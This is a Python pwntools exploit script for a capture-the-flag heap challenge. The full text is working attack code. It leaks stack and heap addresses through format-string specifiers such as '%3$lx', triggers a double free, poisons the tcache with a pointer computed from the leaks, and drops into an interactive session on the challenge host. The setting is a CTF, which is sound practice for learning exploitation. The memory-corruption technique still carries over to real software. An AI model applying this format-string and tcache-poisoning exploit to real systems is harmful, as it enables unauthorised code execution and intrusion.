from pwn import p64, context, ELF, remote, process, log

def new_mess(r, idx, sze):
    # Choice
    r.recvuntil('>>')
    r.sendline(b'1')

    # Index
    r.recvuntil(':')
    r.sendline(idx)

    # Size
    r.recvuntil(':')
    r.sendline(sze)

def del_mess(r, idx):
    # Choice
    r.recvuntil('>>')
    r.sendline(b'2')

    # Index
    r.recvuntil(':')
    r.sendline(idx)

def write_mess(r, idx, mess):
    # Choice
    r.recvuntil('>>')
    r.sendline(b'3')

    # Index
    r.recvuntil(':')
    r.sendline(idx)

    # Message
    r.sendline(mess)

def exploit(checkIfRemote):
    if(checkIfRemote is True):
        r = remote('chaterine.chals.nitectf2024.live', 1337, ssl=True)
        fmt_str = b'%3$lx'
    else:
        context.binary = ELF('./chall', False)
        r = process()
        # fmt_str = b'%3$lx-%12$lx'

    r.sendline(b'%p')
    r.recvuntil('Hello ')
    # stack_leak = int(r.recvline().decode(), 16) + 0x1c0           # Local
    stack_leak = int(r.recvline().decode(), 16) + 0x2130           # Remote

    fmt_str = '%3$lx'
    # context.log_level='debug'
    # Create chunk for format string attack
    new_mess(r, b'0', b'15')
    write_mess(r, b'0', fmt_str)
    # recv_mess = r.recvline().decode().split('-')
    
    heap_leak = int(r.recvline().decode(), 16)
    log.info(f'Address of stack target is: {hex(stack_leak)}')
    log.info(f'Address of leaked chunk is: {hex(heap_leak)}')

    # Double Free Attack
    new_mess(r, b'1', b'15')

    del_mess(r, b'1')
    write_mess(r, b'1', b'A'*8)
    del_mess(r, b'1')

    # Source: https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_poisoning.c
    value = stack_leak ^ heap_leak >> 12
    log.info(f'Value to overwrite: {value}')
    write_mess(r, b'1', p64(value))

    new_mess(r, b'2', b'15')
    new_mess(r, b'3', b'15')
    write_mess(r, b'3', b'spiderdrive')

    r.interactive()

exploit(True)